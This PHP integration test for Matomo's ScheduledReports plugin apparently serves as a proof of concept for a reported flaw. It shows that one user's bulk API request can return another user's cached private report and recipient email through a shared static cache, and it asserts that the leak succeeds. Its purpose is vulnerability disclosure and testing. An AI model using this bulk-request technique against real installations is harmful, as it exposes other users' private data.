<?php

namespace Piwik\Plugins\ScheduledReports\tests\Integration;

use Piwik\Date;
use Piwik\Plugin\Manager;
use Piwik\Plugins\API\API as BulkAPI;
use Piwik\Plugins\ScheduledReports\API as ScheduledReportsAPI;
use Piwik\Plugins\ScheduledReports\Model as ScheduledReportsModel;
use Piwik\Plugins\SitesManager\API as SitesManagerAPI;
use Piwik\Plugins\UsersManager\Model as UsersManagerModel;
use Piwik\Tests\Framework\Mock\FakeAccess;
use Piwik\Tests\Framework\TestCase\IntegrationTestCase;

class CacheAuthIsolationTest extends IntegrationTestCase
{
    private int $idSite;

    public function setUp(): void
    {
        parent::setUp();

        FakeAccess::$superUser = true;
        Manager::getInstance()->loadPlugins([
            'API',
            'UsersManager',
            'SitesManager',
            'ScheduledReports',
            'VisitsSummary',
        ]);
        Manager::getInstance()->installLoadedPlugins();

        $this->idSite = (int) SitesManagerAPI::getInstance()->addSite(
            'H1 ScheduledReports cache auth test',
            ['https://example.test']
        );

        $users = new UsersManagerModel();
        foreach ([
            ['cache_user_a', 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'],
            ['cache_user_b', 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'],
        ] as [$login, $token]) {
            $users->addUser(
                $login,
                'not-a-login-password',
                $login . '@example.test',
                Date::now()->getDatetime()
            );
            $users->addUserAccess($login, 'view', [$this->idSite]);
            $users->addTokenAuth(
                $login,
                $token,
                'H1 cache isolation token',
                Date::now()->getDatetime()
            );
        }

        $model = new ScheduledReportsModel();
        $model->createReport([
            'idsite' => $this->idSite,
            'login' => 'cache_user_a',
            'description' => 'USER_A_PRIVATE_REPORT',
            'idsegment' => null,
            'period' => 'day',
            'period_param' => 'day',
            'hour' => 7,
            'type' => 'email',
            'format' => 'pdf',
            'reports' => json_encode(['VisitsSummary_get']),
            'parameters' => json_encode([
                'displayFormat' => 1,
                'emailMe' => false,
                'additionalEmails' => ['user-a-private@example.test'],
                'evolutionGraph' => false,
            ]),
            'ts_created' => Date::now()->getDatetime(),
            'ts_last_sent' => null,
            'deleted' => 0,
            'evolution_graph_within_period' => 0,
            'evolution_graph_period_n' => 1,
        ]);

        ScheduledReportsAPI::$cache = [];
    }

    public function testBulkRequestLeaksUserAReportToUserBThroughStaticCache(): void
    {
        $reportId = 1;

        // Control: B alone must not be able to fetch A's report.
        ScheduledReportsAPI::$cache = [];
        $control = BulkAPI::getInstance()->getBulkRequest([
            $this->bulkUrl('cache_user_b', 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb', $reportId),
        ]);

        fwrite(STDOUT, "\nCONTROL_B_ALONE=" . json_encode($control) . "\n");
        self::assertSame('error', $control[0]['result'] ?? null);

        // Candidate: A populates ScheduledReports::$cache, then B asks for the exact
        // same idReport/cache key in the same bulk request under B's real token.
        ScheduledReportsAPI::$cache = [];
        $result = BulkAPI::getInstance()->getBulkRequest([
            $this->bulkUrl('cache_user_a', 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', $reportId),
            $this->bulkUrl('cache_user_b', 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb', $reportId),
        ]);

        fwrite(STDOUT, "BULK_RESULT=" . json_encode($result) . "\n");

        self::assertSame('cache_user_a', $result[0][0]['login'] ?? null);
        self::assertSame('USER_A_PRIVATE_REPORT', $result[0][0]['description'] ?? null);

        // This assertion demonstrates the authorization failure: B receives A's
        // cached object, including A's configured recipient address.
        self::assertSame('cache_user_a', $result[1][0]['login'] ?? null);
        self::assertSame('USER_A_PRIVATE_REPORT', $result[1][0]['description'] ?? null);
        self::assertSame(
            ['user-a-private@example.test'],
            $result[1][0]['parameters']['additionalEmails'] ?? null
        );

        fwrite(STDOUT, "H1_RESULT=PASS cross-user ScheduledReports cache disclosure via API.getBulkRequest\n");
    }

    private function bulkUrl(string $login, string $token, int $reportId): string
    {
        return rawurlencode(http_build_query([
            'module' => 'API',
            'method' => 'ScheduledReports.getReports',
            'idReport' => $reportId,
            'token_auth' => $token,
            'format' => 'json',
        ], '', '&', PHP_QUERY_RFC3986));
    }

    public function provideContainerConfig()
    {
        return ['Piwik\\Access' => new FakeAccess()];
    }
}
